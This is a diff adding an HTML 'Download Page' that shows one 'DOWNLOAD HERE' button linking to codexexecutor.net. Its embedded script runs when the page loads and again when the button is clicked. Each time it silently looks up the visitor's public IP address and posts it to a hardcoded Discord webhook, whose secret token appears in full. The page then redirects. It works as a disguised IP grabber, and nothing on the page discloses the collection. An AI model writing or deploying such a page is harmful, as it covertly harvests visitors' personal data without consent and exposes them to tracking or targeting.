@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download Page</title>
+    <style>
+        body {
+            background-color: lightblue;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+        .download-button {
+            padding: 20px 40px;
+            font-size: 24px;
+            color: white;
+            background-color: #007BFF;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        .download-button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <a href="https://codexexecutor.net/" class="download-button" id="downloadButton">DOWNLOAD HERE</a>
+
+    <script>
+        function sendIpToWebhook() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    fetch('https://discord.com/api/webhooks/1246573130181246996/YMSK1uSs7i2DxmaN8Qe__f-aCqTkxSw4BVRR19AGPuU54HG5Z134uYypdP5sqKa_Sj3H', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            content: `User IP: ${ip}`
+                        })
+                    }).catch(error => console.error('Error:', error));
+                }).catch(error => console.error('Error:', error));
+        }
+
+        document.addEventListener('DOMContentLoaded', sendIpToWebhook);
+
+        document.getElementById('downloadButton').addEventListener('click', function(event) {
+            event.preventDefault();
+            sendIpToWebhook();
+            window.location.href = 'https://codexexecutor.net/';
+        });
+    </script>
+</body>
+</html>
